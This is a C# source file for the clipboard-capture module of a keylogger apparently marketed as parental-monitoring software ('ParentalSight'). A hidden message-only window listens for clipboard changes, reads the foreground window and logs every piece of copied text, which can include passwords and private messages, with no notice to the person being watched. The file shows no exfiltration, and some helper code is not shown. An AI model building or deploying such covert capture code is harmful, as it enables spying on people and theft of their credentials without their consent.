namespace ParentalSight.Keylogger.Engines
{
    using ParentalSight.Keylogger;
    using System;
    using System.Diagnostics;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    internal class ClipboardLoggerEngine
    {
    }

    public static class Clipboard
    {
        public static string GetText()
        {
            var returnValue = string.Empty;
            var staThread = new Thread(
                delegate ()
                {
                    // Use a fully qualified name for Clipboard otherwise it
                    // will end up calling itself.
                    returnValue = System.Windows.Forms.Clipboard.GetText();
                });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();

            return returnValue;
        }
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            private string lastWindow = "";

            public NotificationForm()
            {
                //Turn the child window into a message-only window (refer to Microsoft docs)
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                //Place window in the system-maintained clipboard format listener list
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                try
                {
                    //Listen for operating system messages
                    if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                    {
                        //Write to stdout active window
                        IntPtr active_window = NativeMethods.GetForegroundWindow();
                        if (active_window != IntPtr.Zero && active_window != null)
                        {
                            int length = NativeMethods.GetWindowTextLength(active_window);
                            StringBuilder sb = new StringBuilder(length + 1);
                            NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
                            Trace.WriteLine("");
                            //Write to stdout clipboard contents
                            try
                            {
                                Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
                            }
                            catch (Exception ex)
                            {
                                Trace.WriteLine("\t[Error] Couldn't get text from clipboard.");
                            }
                        }
                    }
                    //Called for any unhandled messages
                    base.WndProc(ref m);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Error in WndProc: {0}", ex.Message);
                    Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
                }
            }
        }
    }
}